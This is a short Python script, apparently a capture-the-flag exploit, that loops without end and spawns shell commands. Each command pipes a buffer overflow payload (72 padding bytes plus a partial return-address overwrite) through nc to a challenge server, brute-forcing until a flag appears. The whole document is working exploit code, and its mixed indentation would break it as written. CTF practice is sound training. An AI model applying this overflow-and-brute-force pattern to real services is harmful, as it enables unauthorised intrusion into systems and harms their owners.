import subprocess

# python3 solve.py 2>&1 | grep actf
c = 0
while True:
	subprocess.Popen(["/bin/sh", "-c", "python2 -c 'print \"A\"*72 + \"\\xa9\\x11\"' | nc shell.actf.co 19306"])
        if c % 10 == 0: print("actf" + str(c))
        c += 1
